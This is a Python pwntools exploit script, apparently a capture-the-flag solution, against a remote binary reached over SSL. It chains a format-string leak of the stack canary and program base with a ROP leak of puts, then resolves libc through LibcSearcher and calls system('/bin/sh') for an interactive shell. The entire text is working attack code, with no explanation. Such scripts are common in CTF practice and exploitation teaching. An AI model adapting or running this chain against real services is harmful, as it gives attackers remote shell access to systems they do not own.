from pwn import *
from LibcSearcher import *
import sys

#p = process("./main_2")
p = remote(str(sys.argv[1]), 443, ssl=True, sni=str(sys.argv[1]))
elf = ELF("./main2")
context.arch = "amd64"

p.recvuntil(b"Please fill in your name:")
p.sendline(b'%11$p-%13$p')
p.recvline()

leak = p.recvline()


canary = int(leak.strip(b'\n')[10::].split(b'-')[0],16)
elf.address = int(leak.strip(b'\n')[10::].split(b'-')[1],16) - 0x12c5
pop_rdi = p64(elf.address + 0x1373)
ret = p64(elf.address + 0x101a)
log.success(f"Canary: {hex(canary)}")
log.success(f"elf.address: {hex(elf.address)}")

payload = b"A"*56
payload += p64(canary)
payload += b"A"*8
payload += pop_rdi
payload += p64(elf.got['puts'])
payload += p64(elf.sym['puts'])
payload += p64(elf.sym['main'])

p.sendline(payload)
p.recvline()
p.recvline()

puts = u64(p.recvline().strip(b'\n').ljust(8,b'\x00'))
log.success(f"Puts: {hex(puts)}")

libc = LibcSearcher('puts', puts)
libc_base = puts - libc.dump('puts')
log.success(f"libc_base: {hex(libc_base)}")


payload = b"A"*56
payload += p64(canary)
payload += b"A"*8
payload += pop_rdi
payload += p64(libc_base + libc.dump('str_bin_sh'))
payload += ret
payload += p64(libc_base + libc.dump('system'))

p.recvuntil(b"Please fill in your name:")
p.sendline(b'bbbb')
p.recvuntil(b'Thank you bbbb')
p.sendline(payload)
p.clean()
p.interactive()